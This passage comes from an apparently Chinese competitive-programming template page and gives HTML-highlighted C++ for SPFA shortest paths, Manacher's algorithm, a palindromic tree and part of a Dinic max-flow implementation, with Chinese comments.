operator">=</span> z <span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>to <span class="token operator">=</span> y <span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>    head<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> tot<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>node edge<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> head<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">bool</span> <span class="token function">spfa</span><span class="token punctuation">(</span> <span class="token keyword">int</span> st  <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">bool</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> outque<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>vis<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>vis<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>outque<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>outque<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">)</span> dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span><span class="token comment">//初始化距离</span>queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> q<span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>st<span class="token punctuation">)</span> <span class="token punctuation">,</span> vis<span class="token punctuation">[</span>st<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token punctuation">,</span> dis<span class="token punctuation">[</span>st<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//初始状态</span><span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> u <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>outque<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token operator">++</span> <span class="token punctuation">,</span> vis<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> outque<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">></span> n <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">//有负环 无最短路</span><span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> k <span class="token operator">=</span> head<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">;</span> k <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">=</span> edge<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> v <span class="token operator">=</span> edge<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> dis<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">></span> dis<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> edge<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>dis<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> dis<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> edge<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>w<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token punctuation">)</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token punctuation">,</span> q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span> v <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="15-manacher"><a href="#15-manacher" class="headerlink" title="15. manacher"></a>15. manacher</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">manacher</span><span class="token punctuation">(</span>string<span class="token operator">&amp;</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>R<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">/* * manacher算法 * 需要将字符串预处理成$#x#x#x#x#x#x#形式 ✔ * 若仅求长度为奇数的回文串，最左侧添加特殊字符即可 * 记录当前最右延伸回文半径mx和对应回文中心p * i若位于mx以内，则将对称位置2*p-i的回文半径的不越界部分作为i的回文半径，并且继续向右侧匹配 * 若得到新的最右延伸回文半径，更新mx和p * 回文长度为回文半径-1 * 回文起始位置为 （回文中心位置-回文半径）/2 */</span>    <span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> mx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    R<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>mx <span class="token operator">></span> i<span class="token punctuation">)</span>            R<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>R<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>p <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> mx <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i <span class="token operator">-</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            R<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">+</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> mx<span class="token punctuation">)</span>            p <span class="token operator">=</span> i<span class="token punctuation">,</span> mx <span class="token operator">=</span> i <span class="token operator">+</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="16-Palindromic-Tree"><a href="#16-Palindromic-Tree" class="headerlink" title="16. Palindromic_Tree"></a>16. Palindromic_Tree</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">100005</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">26</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Palindromic_Tree</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> next<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//next指针，next指针和字典树类似，指向的串为当前串两端加上同一个字符构成</span><span class="token keyword">int</span> fail<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//fail指针，失配后跳转到fail指针指向的节点</span><span class="token keyword">int</span> cnt<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> id<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> len<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//len[i]表示节点i表示的回文串的长度</span><span class="token keyword">int</span> S<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">//存放添加的字符</span><span class="token keyword">int</span> last<span class="token punctuation">;</span>  <span class="token comment">//指向上一个字符所在的节点，方便下一次add</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>   <span class="token comment">//字符数组指针</span><span class="token keyword">int</span> p<span class="token punctuation">;</span>   <span class="token comment">//节点指针</span><span class="token keyword">int</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//新建节点</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>next<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>cnt<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>id<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>num<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>len<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">;</span><span class="token keyword">return</span> p<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//初始化</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">newnode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">newnode</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>last <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>S<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//开头放一个字符集中没有的字符，减少特判</span>fail<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">get_fail</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//和KMP一样，失配后找一个尽量最长的</span><span class="token keyword">while</span> <span class="token punctuation">(</span>S<span class="token punctuation">[</span>n <span class="token operator">-</span> len<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> S<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>x <span class="token operator">=</span> fail<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> x<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>c <span class="token operator">-=</span> <span class="token char">'a'</span><span class="token punctuation">;</span>S<span class="token punctuation">[</span><span class="token operator">++</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span><span class="token keyword">int</span> cur <span class="token operator">=</span> <span class="token function">get_fail</span><span class="token punctuation">(</span>last<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//通过上一个回文串找这个回文串的匹配位置</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>next<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//如果这个回文串没有出现过，说明出现了一个新的本质不同的回文串</span><span class="token keyword">int</span> now <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span>len<span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//新建节点</span>fail<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> next<span class="token punctuation">[</span><span class="token function">get_fail</span><span class="token punctuation">(</span>fail<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//和AC自动机一样建立fail指针，以便失配后跳转</span>next<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> now<span class="token punctuation">;</span>num<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>fail<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>last <span class="token operator">=</span> next<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">;</span>cnt<span class="token punctuation">[</span>last<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>id<span class="token punctuation">[</span>last<span class="token punctuation">]</span> <span class="token operator">=</span> n<span class="token punctuation">;</span> <span class="token comment">//id[第last个节点]=第n个字符</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> le <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> tmp<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> le<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'a'</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span>cnt<span class="token punctuation">[</span>fail<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> cnt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//父亲累加儿子的cnt，因为如果fail[v]=u，则u一定是v的子回文串！</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h3 id="17-dinic"><a href="#17-dinic" class="headerlink" title="17. dinic"></a>17. dinic</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">inf</span> <span class="token expression"><span class="token number">1e9</span></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">500</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Edge</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> from<span class="token punctuation">,</span>to<span class="token punctuation">,</span>cap<span class="token punctuation">,</span>flow<span class="token punctuation">;</span>    <span class="token function">Edge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token function">Edge</span><span class="token punctuation">(</span><span class="token keyword">int</span> f<span class="token punctuation">,</span><span class="token keyword">int</span> t<span class="token punctuation">,</span><span class="token keyword">int</span> c<span class="token punctuation">,</span><span class="token keyword">int</span> flow<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">from</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">to</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">cap</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">flow</span><span class="token punctuation">(</span>flow<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Dinic</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">,</span>s<span class="token punctuation">,</span>t<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>Edge<span class="token operator">></span> edges<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cur<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> d<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token keyword">int</span> s<span class="token punctuation">,</span><span class="token keyword">int</span> t<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token operator">-></span>n<span class="token operator">=</span>n<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token operator">-></span>s<span class="token operator">=</span>s<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token operator">-></span>t<span class="token operator">=</span>t<span class="token punctuation">;</span>        edges<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">AddEdge</span><span class="token punctuation">(</span><span class="token keyword">int</span> from<span class="token punctuation">,</span><span class="token keyword">int</span> to<span class="token punctuation">,</span><span class="token keyword">int</span> cap<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        edges<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token function">Edge</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span>to<span class="token punctuation">,</span>cap<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        edges<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token function">Edge</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span>from<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        m <span class="token operator">=</span> edges<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        G<span class="token punctuation">[</span>from<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        G<span class="token punctuation">[</span>to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token function">BFS</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>vis<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>vis<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> Q<span class="token punctuation">;</span>        d<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        Q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>Q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> x<span class="token operator">=</span>Q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                Edge<span class="token operator">&amp;</span> e<span class="token operator">=</span>edges<span class="token punctuation">[</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>cap<span class="token operator">></span>e<span class="token punctuation">.</span>flow<span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    vis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>                    Q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>to<span class="token punctuation">)</span><span class="token punctuation">;</span>                    d<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">1</span><span class="token operator">+</span>d<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> vis<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">DFS</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> a<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">==</span>t <span class="token operator">||</span> a<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> a<span class="token punctuation">;</span>        <span class="token keyword">int</span> flow<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>f<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">&amp;</span> i<span class="token operator">=</span>cur<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            Edge<span class="token operator">&amp;</span> e<span class="token operator">=</span>edges<span class="token punctuation">[</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">==</span>d<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>f<span class="token operator">=</span><span class="token function">DFS</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>to<span class="token punctuation">,</span><span class="token function">min</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>e<span class="token punctuation">.</span>cap<span class="token operator">-</span>e<span class="token punctuation">.</span>flow<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span>flow<span class="token operator">+=</span>f<span class="token punctuation">;</span>                edges<span class="token punctuation">[</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flow <span class="token operator">-=</span>f<span class="token punctuation">;</span>                flow<span class="token 